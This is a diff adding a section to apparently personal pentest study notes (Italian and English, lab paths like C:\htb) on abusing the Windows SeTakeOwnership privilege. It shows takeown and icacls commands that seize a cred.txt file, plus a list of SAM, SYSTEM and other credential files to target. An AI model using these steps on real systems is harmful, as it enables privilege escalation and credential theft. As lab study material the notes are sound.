@@ -253,3 +253,54 @@ con 612 PID di winlogon.exe che abbiamo ricavato con tasklist
 ![image](https://github.com/user-attachments/assets/acede22f-b517-40fe-b5a3-300b2a081c6f)
 
 
+# SeTakeOwnership
+
+Da' la possibilita' ad un utente di prendere il possesso di qualsiasi securable object.
+
+Si puo' cambiare il **WRITE_OWNER**, quindi possiamo cambiare l' owner di un oggetto nel suo security descriptor.
+
+E' Raro trovare utenti normali con questo privilegio ma non e' raro trovare servizi che ce l'hanno.
+
+spesso si trova su servzi che sono tasked with running backup jobs and VSS snapshots assigned this privilege.
+
+**SeRestorePrivilege**, and **SeSecurityPrivilege** to control this account's privileges at a more granular level and not granting the account full local admin rights.
+
+These privileges on their own could likely be used to escalate privileges. Still, there may be times when we need to take ownership of specific files because other methods are blocked, or otherwise, do not work as expected. Abusing this privilege is a bit of an edge case. Still, it is worth understanding in-depth, especially since we may also find ourselves in a scenario in an Active Directory environment where we can assign this right to a specific user that we can control and leverage it to read a sensitive file on a file share.
+
+The setting can be set in Group Policy under:
+
+Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment
+
+Si puo' sfruttare ad esempio con eseguibili come: https://github.com/FSecureLABS/SharpGPOAbuse 
+![image](https://github.com/user-attachments/assets/87be223d-30dc-46b2-a2a1-a8e66f4c0ade)
+
+## Leveraging the privilege
+
+prima **abilitiamo i privilegi disabilitati**
+```
+PS C:\htb> Import-Module .\Enable-Privilege.ps1
+PS C:\htb> .\EnableAllTokenPrivs.ps1
+PS C:\htb> whoami /priv
+```
+
+Poi **scegliamo un target file**(che puo' anche essere in una share pubblic o privata)
+
+poi **runniamo `takeown`**: `PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'`
+
+checkiamo che takeown ha funzionato: `PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}`
+
+modifichiamo la **ACL** del file con **icacls**: `PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F` per darci permessi
+
+**FILE INTERESSANTI DI CUI PRENDERE IL CONTROLLO**:
+```
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
+We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
